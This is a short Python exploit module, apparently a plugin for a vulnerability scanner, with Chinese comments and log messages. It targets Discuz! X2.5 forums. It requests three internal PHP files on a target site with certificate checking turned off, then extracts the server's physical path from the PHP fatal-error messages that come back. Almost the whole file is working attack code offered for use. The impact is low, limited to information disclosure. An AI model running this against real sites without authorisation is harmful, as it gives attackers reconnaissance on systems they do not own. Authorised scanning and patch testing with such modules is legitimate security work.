#!/usr/bin/env python
# -*- coding: utf-8 -*-

import re
import sys
from script.lib import logger
from script.lib import requests

author = "SpongeB0B"
scope = "Discuz! x2.5"
description = "物理路径泄露漏洞 报错导致路径泄露"
reference = "http://www.uedbox.com/discuzx25-explosive-path/"
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]
def exploit(url):
	headers = {
		"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
	}
	payloads = ["/uc_server/control/admin/db.php",
				"/source/plugin/myrepeats/table/table_myrepeats.php",
				"/install/include/install_lang.php"]
	try:
		for payload in payloads:
			vulnurl = url + payload
			req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
			pattern = re.search('Fatal error.* in <b>([^<]+)</b> on line <b>(\d+)</b>', req.text)
			if pattern:
				logger.success("[+]存在Discuz! X2.5 物理路径泄露漏洞...(低危)\tpayload: "+vulnurl+"\tGet物理路径: "+pattern.group(1))
				return vulnurl

	except:
		logger.error("[-] "+vulnurl+"====>连接超时")
